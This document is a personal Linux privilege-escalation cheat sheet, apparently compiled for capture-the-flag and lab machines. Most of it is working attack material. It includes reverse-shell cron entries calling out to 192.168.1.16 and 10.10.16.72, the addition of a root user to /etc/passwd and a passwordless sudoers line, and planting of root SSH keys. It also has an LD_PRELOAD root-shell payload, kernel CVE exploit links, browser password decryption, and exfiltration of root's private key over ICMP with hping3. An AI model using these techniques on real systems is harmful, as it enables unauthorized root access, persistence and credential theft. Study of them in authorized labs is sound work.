* Linux Privilege Escalation:
	- Step 1:
		uname -a && echo && lsb_release -a && echo && printenv && echo && cat /usr/lib/os-release
		sudo -l && sudo -s
		netstat -ano
		getcap -r / 2>/dev/null
		ls -al /tmp; echo; ls -al /var/tmp; echo; ls -al /dev/shm; echo; ls -al /opt
		ps aux > ps
		
		find / -perm -4000 2>/dev/null
		find / -user 1007 -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
		find / -group security -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
		find / -type d -perm -o+w -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
		find / -user root -perm '600' -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
		
		find / -name *.txt 2>/dev/null
		
	- Step 2:
		Search for database => password => horizontal escalation.
		Vulnerable binary run as sudo. => SO injection
		Create user, change group, add group, .... => read sudoers, shadow
		
		
	- Crontab:
		pspy
	- Auto:
		linpeas
	- Mount Option:
	- WriteFile:
		/etc/shadows
		/etc/passwd
			openssl passwd 123
			echo 'user3:ghTC5HTjVd/7M:0:0:root:/root:/bin/bash' >> /etc/passwd
			tail /etc/passwd
			mkpasswd -m SHA-512 pass123
		/root/.ssh/authorized_keys
			ssh-keygen -f broker
			cat broker.pub > /root/.ssh/authorized_keys
		/var/spool/cron/crontabs/root # root is username that can be kali or user1, 2, 3, ....
			* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.16/445 0>&1'
			-rw------- 1 love     love      106 Mar 17 09:02 love #==> chmod == 0600 && correctusername
		/etc/sudoers
			- read:
				sudo /usr/sbin/adduser ns --gid=0 #==> read sudoers and more (djinn3)
			- write:
				echo "love ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
			
	
	- Set Enviroment:
		- LD_PRELOAD (photobomb.htb, clicker.htb)
		- PATH (photobomb.htb, clicker.htb)
			https://book.hacktricks.xyz/linux-hardening/privilege-escalation#setenv 
			https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root
			https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8
			
		- Perl-statup:
			sudo PERL5OPT=-d PERL5DB='exec "whoami"' /opt/monitor.sh (clicker.htb)
			
	- Sudo token: (ref: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens)
		echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope #==> temporarily enable ptrace_scope
		sh exploit_v3.sh #==> work on ubuntu test | worth a try :sh exploit.sh	sh exploit_v2.sh 
	
	- .mozilla in home:(ref: https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/browser-artifacts#firefox)
		- firefox:
			git: https://github.com/unode/firefox_decrypt
			python3 firefox_decrypt.py /home/kali/stuffs/offsec/insanityhosting/mozilla/firefox (insanityhosting)
			
		
	
	- Kernel CVE:
		- CVE-2023-2640-CVE-2023-32629	ref: https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629
		- CVE-2023-4911	ref: https://github.com/hadrian3689/looney-tunables-CVE-2023-4911
		- CVE-2022-0847	ref: https://haxx.in/files/dirtypipez.c
			kernel >=5.8
		- CVE-2021-3156	ref: https://github.com/worawit/CVE-2021-3156 ==> exploit_nss.py
			Ubuntu 20.04 kernel 5.4 
			
		

* Technical:
	- Write etc/shadow:
		mkpasswd --method=SHA-512 --stdin
		openssl passwd -6 -salt xyz  yourpass
		# Ref: https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow
	- Get strings out of C/C++,... : 
		strings password-manager
		grep password-manager|strings
		strings -e l password-manager (-e Encrypt type => man strings for more information)
		xxd password-manager # ==> hexdump or reverse
	- Docker: 
		wget https://github.com/alpinelinux/docker-alpine/raw/e7f8cc3aebd309337497c1e794db9aabbb9902c0/x86_64/alpine-minirootfs-3.18.4-x86_64.tar.gz
		cat alpine-minirootfs-3.18.4-x86_64.tar.gz|docker import - alpine:latest =>> import locally
		docker run --rm -it -v /:/mnt alpine /bin/sh
			--rm: delete container when it's done
			-it: interactive shell
			-v mount point (ex: /:/mnt => mount root to /mnt of docker container )
			
			
	- Lxc/lxd:
		https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
	- Find all owner ship:  
		find / -user michael 2>/dev/null
		find / -group security 2>/dev/null
		find / -group security -ls 2>/dev/null
		find / -type d -perm -o+w
		find / -perm -4000 2>/dev/null
			/usr/bin/su
			/usr/bin/sudo
			/usr/bin/mount
			/usr/bin/umount
			/usr/bin/newgrp
			/usr/bin/passwd
			/usr/bin/gpasswd
			/usr/bin/chsh
			/usr/bin/chfn
			/usr/bin/pkexec
			/usr/bin/fusermount3
			/usr/sbin/exim4
			/usr/sbin/pppd
		
		find / -user 1007 -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
		find / -type d -perm -o+w -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
		find / -user root -perm '600' -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" 2>/dev/null
		
		find / -name *.txt 2>/dev/null
	- Java:
		- Change version:
			sudo mkdir /usr/lib/jvm
			mv 'jdk-8u281-linux-x64.tar.gz?AuthParam=1614342179_659c3e77bffb9a532e2e87404c0c6647' jdk-8u281-linux-x64.tar.gz
			sudo tar xvf jdk-8u281-linux-x64.tar.gz -C /usr/lib/jvm
			#Add Java bin to update-alternatives
			sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_281/bin/java" 100
			sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_281/bin/javac" 100
			#Choose Java version CLI
			sudo update-alternatives --config java
			
		- Fix java.lang.reflect.InaccessibleObjectException:
			# --add-opens has the following syntax: {A}/{package}={B}
			java --add-opens java.base/java.util=ALL-UNNAMED
			java --add-opens java.base/java.util=ALL-UNNAMED -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_curl.ser "curl 127.0.0.1"
	- Shared objects:
		- ltrace {binary}| strace {binary}|ldd {binary} ==> ref: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ld.so.conf-example
		- static void vuln_func() __attribute__((constructor)); ==> add this to auto-run on load (zipping.htb)
			ref:Sudo Privilege Escalation by Overriding Shared Library ==> https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/
		
	- LD_PRELOAD (photobomb.htb, clicker.htb)
		nano ld_preload.c
			#include <stdio.h>
			#include <sys/types.h>
			#include <stdlib.h>

			void _init() {
					unsetenv("LD_PRELOAD");
					setresuid(0,0,0);
					system("/bin/bash -p");
			}
		gcc -fPIC -shared -nostartfiles -o ./ld_preload.so ./ld_preload.c
		./ld_preload.c: In function ‘_init’:
		./ld_preload.c:7:9: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
			7 |         setresuid(0,0,0);
			  |         ^~~~~~~~~
		sudo LD_PRELOAD=/tmp/ld_preload.so /opt/monitor.sh
	
	- Mount Option:
		- There maybe link to /bin/bash as root (Ref:https://book.hacktricks.xyz/linux-hardening/privilege-escalation#drives)
		
	- Crontab:
		- /etc/cron.d ---> used by packages
		- /etc/crontab ---> system crontab (with additional user directive)
		- /var/spool/cron/crontabs ---> user crontab
			/var/spool/cron/crontabs/root # root is username that can be kali or user1, 2, 3, ....
			* * * * * /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.72 444 >/tmp/f'
---------------------------------------------------------------------------------------------------------------------------------------------------
- symlink to crontab prives
	https://arz101.medium.com/hackthebox-photobomb-5d241754116e
	
- sudoas
	/usr/local/etc/doas.conf

- borg
	sudo /usr/bin/borg list /opt/borgbackup/ ==> home
	sudo /usr/bin/borg extract --stdout '/opt/borgbackup::home'  
		Without --stdout borg will extract the files on the same directory for which you don't have permission so when you add the --stdout option borg will extract the files to standard output. ref: https://borgbackup.readthedocs.io/en/stable/usage/extract.html
		
- hping3 (icmp.vulhub )
	# sudo /usr/sbin/hping3 --icmp 127.0.0.1 --listen signature --dump ==> --dump broke output 
	sudo /usr/sbin/hping3 --icmp 127.0.0.1 --listen signature --safe #==> 127.0.0.1 on same machine or following gtfo payload 
	sudo /usr/sbin/hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa #==> 
		


	docker pull gcc:4.9
	# 4.9: Pulling from library/gcc
	# Digest: sha256:6356ef8b29cc3522527a85b6c58a28626744514bea87a10ff2bf67599a7474f5
	# Status: Image is up to date for gcc:4.9
	# docker.io/library/gcc:4.9

	docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.9 gcc -o exploit exploit.c
	file exploit
	# exploit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
	# interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, not stripped
